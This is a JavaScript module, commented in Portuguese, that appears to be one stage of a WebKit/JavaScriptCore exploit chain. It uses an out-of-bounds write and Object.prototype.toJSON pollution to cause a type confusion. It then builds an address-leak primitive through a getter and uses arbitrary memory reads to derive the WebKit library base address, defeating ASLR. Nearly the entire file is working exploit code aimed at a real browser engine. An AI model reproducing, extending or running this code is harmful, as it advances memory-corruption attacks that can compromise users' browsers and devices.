// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43L - Addrof com Getter - Revertido para Teste Focado)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Importar configs

// Nome do módulo revertido para o original (sem "_Massive")
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Offset OOB fixo
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; // Lista simples de valores OOB (normalmente um valor)

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = Math.random();
const PROBE_CALL_LIMIT_V82 = 10;

// Offsets para WebKit Leak, usando config.mjs
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);

// !! ATENÇÃO !! Este offset é relativo à instância Executable.
// O config.mjs fornecido não detalha a estrutura Executable.
// Mantendo o valor original de 0x8. Valide este offset com seu disassembly.
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();

    if (high === 0 && low === 0) {
        logS3(`[isValidPointer-${context}] Ponteiro NULO (0x0) detectado.`, "debug_detail");
        return false;
    }
    if (high === 0x7FF80000 && low === 0x0) { // Valor específico do log anterior
        logS3(`[isValidPointer-${context}] Ponteiro específico NaN (0x7ff8000000000000) detectado.`, "debug_detail");
        return false;
    }
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0) ) {
         logS3(`[isValidPointer-${context}] Potencial NaN (não apenas 0x7ff8000000000000) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    if (high === 0 && low < 0x10000) {
        logS3(`[isValidPointer-${context}] Ponteiro baixo (provavelmente NULL page ou similar) detectado: ${ptr.toString(true)}`, "debug_detail");
        return false;
    }
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Addrof + WebKit Base Leak (R43L Focado) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R43L Focado...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_Instance_Focado() { return `target_R43L_Focado_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, 'info');

    logS3(`--- Fase 0 (R43L Focado): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity check OOB falhou. Abortando ${FNAME_CURRENT_TEST_BASE}.`, "critical", FNAME_CURRENT_TEST_BASE);
        document.title = `${FNAME_CURRENT_TEST_BASE} OOB Sanity Fail!`;
        return {
            errorOccurred: "OOB Sanity Check Failed",
            tc_probe_details: null, stringifyResult: null,
            addrof_result: { success: false, msg: "Addrof (R43L Focado): Not run due to OOB Sanity Fail.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
            webkit_leak_result: { success: false, msg: "WebKit Leak (R43L Focado): Not run due to OOB Sanity Fail.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
            iteration_results_summary: [],
            total_probe_calls_last_iter: 0,
            oob_value_of_best_result: null, // Compatível com o runner original
            heisenbug_on_M2_in_best_result: false
        };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (R43L Focado): Not run.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R43L Focado): Not run.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_value_of_best_result: null, // Campo esperado pelo runner original
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    // Loop principal (geralmente roda uma vez com OOB_WRITE_VALUES_V82 = [0xABABABAB])
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        leaked_target_function_addr = null;
        const current_oob_hex_val = toHex(current_oob_value !== undefined && current_oob_value !== null ? current_oob_value : 0);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`; // Sem offset no nome da iteração
        logS3(`\n===== ITERATION R43L Focado: OOB Write Value: ${current_oob_hex_val} (Raw: ${current_oob_value}) =====`, "subtest", FNAME_CURRENT_ITERATION);
        document.title = `${FNAME_CURRENT_TEST_BASE} Testing Val:${current_oob_hex_val}`;

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let iter_addrof_result = { success: false, msg: "Addrof (R43L Focado): Not run in this iter.", leaked_object_addr: null, leaked_object_addr_candidate_str: null };

        function toJSON_TA_Probe_Iter_Closure_R43L_Focado() {
            probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) {
                    logS3(`[PROBE_R43L_Focado] Call #${call_num}: Limite de chamadas atingido. Parando.`, "warn");
                    return { r_stop: "limit_exceeded", call_num: call_num };
                }
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82_focado: "M2_Iter_R43L_Focado" };
                    marker_M1_ref_iter = { marker_id_v82_focado: "M1_Iter_R43L_Focado", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_R43L_Focado] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                    return marker_M1_ref_iter;
                } else if (is_m2c) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R43L_Focado", this_type: "[object Object]",
                            this_is_M2: true, getter_defined: false, getter_fired: false,
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R43L_Focado] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_v82_focado}. Definindo getter...`, "vuln");

                        try {
                            Object.defineProperty(this, 'leaky_addr_getter_R43L_Focado', { // Nome do getter pode ser o mesmo
                                get: function() {
                                    logS3(`[PROBE_R43L_GETTER_Focado] Getter 'leaky_addr_getter_R43L_Focado' ACIONADO!`, "vuln");
                                    if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_fired = true;

                                    if (!victim_typed_array_ref_iter?.buffer) {
                                        iter_addrof_result.msg = "AddrofGetter (R43L Focado): victim_typed_array_ref_iter.buffer é nulo.";
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = "addrof_victim_null";
                                        return "getter_victim_null";
                                    }
                                    if (typeof targetFunctionForLeak !== 'function') {
                                        iter_addrof_result.msg = "AddrofGetter (R43L Focado): targetFunctionForLeak não é uma função.";
                                        return "getter_target_invalid";
                                    }

                                    let float_view = new Float64Array(victim_typed_array_ref_iter.buffer);
                                    let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
                                    const original_low = uint32_view[0]; const original_high = uint32_view[1];
                                    const original_float_val = float_view[0];

                                    try {
                                        float_view[0] = targetFunctionForLeak;
                                        const leaked_low = uint32_view[0];
                                        const leaked_high = uint32_view[1];
                                        logS3(`[PROBE_R43L_GETTER_DEBUG_Focado] Original no buffer: L:0x${original_low.toString(16)} H:0x${original_high.toString(16)} (Float: ${original_float_val})`, "leak_detail");
                                        logS3(`[PROBE_R43L_GETTER_DEBUG_Focado] Raw após escrita obj: L:0x${leaked_low.toString(16)} H:0x${leaked_high.toString(16)}`, "leak");

                                        if (float_view[0] !== targetFunctionForLeak) {
                                            logS3(`[PROBE_R43L_GETTER_WARN_Focado] Escrita de targetFunctionForLeak em float_view[0] não persistiu! float_view[0] é ${typeof float_view[0]}`, "warn");
                                        }

                                        const potential_addr = new AdvancedInt64(leaked_low, leaked_high);
                                        iter_addrof_result.leaked_object_addr_candidate_str = potential_addr.toString(true);
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = iter_addrof_result.leaked_object_addr_candidate_str;

                                        if (isValidPointer(potential_addr, "_getterAddrof_Focado")) {
                                            leaked_target_function_addr = potential_addr;
                                            iter_addrof_result.leaked_object_addr = leaked_target_function_addr.toString(true);
                                            iter_addrof_result.success = true;
                                            iter_addrof_result.msg = "AddrofGetter (R43L Focado): Sucesso ao obter endereço candidato da função.";
                                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_is_ptr = true;
                                            logS3(`[PROBE_R43L_GETTER_Focado] SUCESSO! Addr: ${leaked_target_function_addr.toString(true)}`, "vuln");
                                            return "getter_addrof_success";
                                        } else {
                                            iter_addrof_result.msg = `AddrofGetter (R43L Focado): Endereço candidato (${iter_addrof_result.leaked_object_addr_candidate_str}) não parece ponteiro válido.`;
                                            if (leaked_low === original_low && leaked_high === original_high) {
                                                 iter_addrof_result.msg += " Conteúdo do buffer não alterado pela escrita do objeto.";
                                                 logS3(`[PROBE_R43L_GETTER_Focado] Conteúdo do buffer não foi alterado.`, "warn");
                                            }
                                            return "getter_addrof_invalid_ptr";
                                        }
                                    } catch (e_addrof_getter) {
                                        iter_addrof_result.msg = `AddrofGetter (R43L Focado) EXCEPTION: ${e_addrof_getter.message}`;
                                        if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.leak_val_getter_int64 = `addrof_getter_ex:${e_addrof_getter.message}`;
                                        console.error("[PROBE_R43L_GETTER_Focado] Exceção:", e_addrof_getter);
                                        return "getter_addrof_exception";
                                    } finally {
                                        uint32_view[0] = original_low;
                                        uint32_view[1] = original_high;
                                        logS3(`[PROBE_R43L_GETTER_DEBUG_Focado] Buffer restaurado para L:0x${uint32_view[0].toString(16)} H:0x${uint32_view[1].toString(16)}`, "leak_detail");
                                    }
                                },
                                enumerable: true, configurable: true
                            });
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                            logS3(`[PROBE_R43L_Focado] Getter 'leaky_addr_getter_R43L_Focado' definido em M2.`, "debug");
                        } catch (e_def_getter) {
                            logS3(`[PROBE_R43L_Focado] ERRO ao definir getter em M2: ${e_def_getter.message}`, "error");
                            if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `DefineGetterErr: ${e_def_getter.message}`;
                        }
                    }
                    return this;
                }
            } catch (e_pm) {
                if (iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `ProbeMainErr:${e_pm.message}`;
                else { iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErrEarly:${e_pm.message}` }; }
                console.error("[PROBE_R43L_Focado] Erro principal na sonda:", e_pm);
                logS3(`[PROBE_R43L_Focado] Call #${call_num}: Erro na sonda: ${e_pm.message}`, "error");
                return { err_pm: call_num, msg: e_pm.message, type: ctts };
            }
            logS3(`[PROBE_R43L_Focado] Call #${call_num}: 'this' é ${ctts}. Retornando tipo.`, "debug_detail");
            return { gen_m: call_num, type: ctts };
        }

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null;
        let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R43L Focado): Not run in this iter.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null };
        let heisenbugConfirmedThisIter = false;

        try {
            logS3(`  --- Fase 1 (R43L Focado): Detecção de Type Confusion & Addrof via Getter (Val: ${current_oob_hex_val}) ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            // Usar o offset OOB fixo definido no topo do script
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            logS3(`   OOB Write: Escrito valor ${current_oob_hex_val} no offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
            await PAUSE_S3(150);

            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`   Victim TypedArray criado e preenchido com padrão: ${FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD}`, 'debug_detail');

            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43L_Focado, writable: true, configurable: true, enumerable: false });
                polluted = true;
                logS3(`   Object.prototype.toJSON poluído com sonda. Chamando JSON.stringify...`, 'debug');
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }
                logS3(`   JSON.stringify output (raw): ${iter_raw_stringify_output}`, 'debug_detail');

                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Probe R43L Focado: TC on M2 CONFIRMED. Getter def: ${iteration_final_tc_details_from_probe.getter_defined}. Getter fired: ${iteration_final_tc_details_from_probe.getter_fired}. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || iter_addrof_result.leaked_object_addr_candidate_str || 'N/A'}`, iter_addrof_result.success ? "vuln" : "warn", FNAME_CURRENT_ITERATION);
                } else {
                    logS3(`  TC Probe R43L Focado: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error", FNAME_CURRENT_ITERATION);
                }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC/Addrof Probe R43L Focado: JSON.stringify EXCEPTION: ${e_str.message}`, "error", FNAME_CURRENT_ITERATION);
                console.error("Erro no stringify R43L Focado:", e_str);
                if (!iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe = {};
                iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` StringifyErr: ${e_str.message}`;
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                    logS3(`   Object.prototype.toJSON restaurado.`, 'debug');
                }
            }
            logS3(`  --- Fase 1 (R43L Focado) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, heisenbugConfirmedThisIter && iter_addrof_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            logS3(`  --- Fase 2 (R43L Focado): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter && iter_addrof_result.success && leaked_target_function_addr) {
                 if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                    logS3(`   WebKitLeak: Ambiente OOB não está pronto. Tentando re-inicializar...`, "warn", FNAME_CURRENT_ITERATION);
                    await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                }
                if (!isOOBReady()) {
                    iter_webkit_leak_result.msg = "WebKit Leak (R43L Focado): Falha ao preparar/re-preparar ambiente OOB para arb_read.";
                    logS3(`   ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                } else {
                    try {
                        logS3(`  WebKitLeak: Endereço da função alvo (leaked_target_function_addr): ${leaked_target_function_addr.toString(true)}`, 'info', FNAME_CURRENT_ITERATION);
                        const ptr_to_executable_instance = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                        iter_webkit_leak_result.internal_ptr_stage1 = isAdvancedInt64Object(ptr_to_executable_instance) ? ptr_to_executable_instance.toString(true) : String(ptr_to_executable_instance);
                        if (!isValidPointer(ptr_to_executable_instance, "_execInst_Focado")) {
                            throw new Error(`Ponteiro para ExecutableInstance inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage1}`);
                        }
                        logS3(`  WebKitLeak: Ponteiro para ExecutableInstance lido de [func_addr + ${FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE.toString(true)}]: ${ptr_to_executable_instance.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                        const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                        iter_webkit_leak_result.internal_ptr_stage2 = isAdvancedInt64Object(ptr_to_jit_or_vm) ? ptr_to_jit_or_vm.toString(true) : String(ptr_to_jit_or_vm);
                        if (!isValidPointer(ptr_to_jit_or_vm, "_jitVm_Focado")) {
                            throw new Error(`Ponteiro para JIT/VM inválido ou nulo: ${iter_webkit_leak_result.internal_ptr_stage2}`);
                        }
                        logS3(`  WebKitLeak: Ponteiro para JIT/VM lido de [exec_addr + ${EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM.toString(true)}]: ${ptr_to_jit_or_vm.toString(true)}`, 'leak', FNAME_CURRENT_ITERATION);

                        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
                        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);

                        iter_webkit_leak_result.webkit_base_candidate = webkit_base_candidate.toString(true);
                        iter_webkit_leak_result.success = true;
                        iter_webkit_leak_result.msg = `WebKitLeak (R43L Focado): Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`;
                        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                    } catch (e_webkit_leak) {
                        iter_webkit_leak_result.msg = `WebKitLeak (R43L Focado) EXCEPTION: ${e_webkit_leak.message || String(e_webkit_leak)}`;
                        logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                        if (!iter_primary_error) iter_primary_error = e_webkit_leak;
                        console.error("Erro no WebKitLeak R43L Focado:", e_webkit_leak);
                    }
                }
            } else {
                let skipMsg = "WebKitLeak (R43L Focado): Pulado. ";
                if (!heisenbugConfirmedThisIter) skipMsg += "TC Fase 1 falhou. ";
                if (!iter_addrof_result.success) skipMsg += "Addrof falhou. ";
                if (!leaked_target_function_addr) skipMsg += "Endereço da função alvo não obtido. ";
                iter_webkit_leak_result.msg = skipMsg;
                logS3(iter_webkit_leak_result.msg, "warn", FNAME_CURRENT_ITERATION);
            }
            logS3(`  --- Fase 2 (R43L Focado) Concluída. WebKitLeak Sucesso: ${iter_webkit_leak_result.success} ---`, iter_webkit_leak_result.success ? "good" : "subtest_warn", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) {
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  CRITICAL ERROR ITERATION R43L Focado (Val:${current_oob_hex_val}): ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
            console.error(`Outer error in iteration R43L Focado (Val:${current_oob_hex_val}):`, e_outer_iter);
            if (iteration_final_tc_details_from_probe) {
                iteration_final_tc_details_from_probe.error_probe = (iteration_final_tc_details_from_probe.error_probe || "") + ` OuterIterErr: ${e_outer_iter.message}`;
            } else {
                iteration_final_tc_details_from_probe = { error_probe: `OuterIterErrEarly: ${e_outer_iter.message}` };
            }
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43LFocado` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_value: current_oob_hex_val, // Apenas o valor, já que o offset é fixo
            raw_oob_value: current_oob_value,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null,
            stringifyResult: iter_stringify_output_parsed,
            addrof_result_this_iter: iter_addrof_result,
            webkit_leak_result_this_iter: iter_webkit_leak_result,
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_value_of_best_result === null ) {
                current_is_better_than_best = true;
            } else {
                const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                      (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                      (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                   (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                   (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                if (current_score > best_score) {
                    current_is_better_than_best = true;
                }
            }
            if (current_is_better_than_best) {
                best_result_for_runner = {
                    errorOccurred: null,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_value_of_best_result: current_iter_summary.oob_value, // Mantém o formato original
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                };
            }
        } else if (best_result_for_runner.oob_value_of_best_result === null && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = {
                errorOccurred: current_iter_summary.error,
                tc_probe_details: current_iter_summary.tc_probe_details,
                stringifyResult: current_iter_summary.stringifyResult,
                addrof_result: current_iter_summary.addrof_result_this_iter,
                webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                oob_value_of_best_result: current_iter_summary.oob_value,
                heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
            };
        }

        if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: WebKitLeak OK!`;
        else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Addrof OK`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: TC OK`;
        else document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Iter Done (${current_oob_hex_val})`;
        await PAUSE_S3(100); // Pausa entre iterações do OOB_WRITE_VALUES_V82 (se houver mais de um)
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R43L Focado): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    // Atualizar o título final baseado no melhor resultado
    if (best_result_for_runner.webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: WebKitLeak OK!`;
    else if (best_result_for_runner.addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: Addrof OK`;
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: TC OK`;
    else if (best_result_for_runner.errorOccurred) document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: Error - ${best_result_for_runner.errorOccurred}`;
    else document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: No Success`;

    return { // Garante que a estrutura de retorno seja compatível com o runner original
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_of_best_result, // Chave esperada pelo runner
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe // Chave esperada pelo runner
    };
}
